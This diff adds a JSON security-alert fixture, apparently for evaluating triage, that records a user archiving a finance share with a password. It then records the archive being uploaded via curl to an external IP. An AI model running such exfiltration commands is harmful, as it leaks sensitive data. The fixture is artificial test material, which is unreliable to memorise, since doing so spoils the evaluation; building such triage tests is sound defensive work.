@@ -1,0 +1,46 @@
+{
+ "alert_id": "EVAL-08",
+ "title": "Large outbound transfer outside business hours",
+ "source": "NDR",
+ "host": "WS-LEG-04",
+ "description": "About 850 MB sent to an external host at 02:13 local time.",
+ "process_events": [
+  {
+   "timestamp": "2026-11-10T14:00:00Z",
+   "pid": 2000,
+   "ppid": 640,
+   "image": "C:\\Windows\\explorer.exe",
+   "command_line": "C:\\Windows\\Explorer.EXE",
+   "user": "LEG\\akhan"
+  },
+  {
+   "timestamp": "2026-11-11T02:13:00Z",
+   "pid": 4300,
+   "ppid": 2000,
+   "image": "C:\\Program Files\\7-Zip\\7z.exe",
+   "command_line": "7z.exe a -pS3cret C:\\Users\\Public\\q3.7z C:\\Shares\\Finance\\Q3\\*",
+   "user": "LEG\\akhan"
+  },
+  {
+   "timestamp": "2026-11-11T02:19:40Z",
+   "pid": 4310,
+   "ppid": 2000,
+   "image": "C:\\Windows\\System32\\curl.exe",
+   "command_line": "curl.exe -k -T C:\\Users\\Public\\q3.7z https://198.51.100.200/upload",
+   "user": "LEG\\akhan"
+  }
+ ],
+ "network_connections": [
+  {
+   "timestamp": "2026-11-11T02:19:41Z",
+   "pid": 4310,
+   "src_ip": "10.20.1.25",
+   "dst_ip": "198.51.100.200",
+   "dst_port": 443,
+   "protocol": "tcp",
+   "bytes_out": 891000000,
+   "bytes_in": 2000,
+   "domain": null
+  }
+ ]
+}
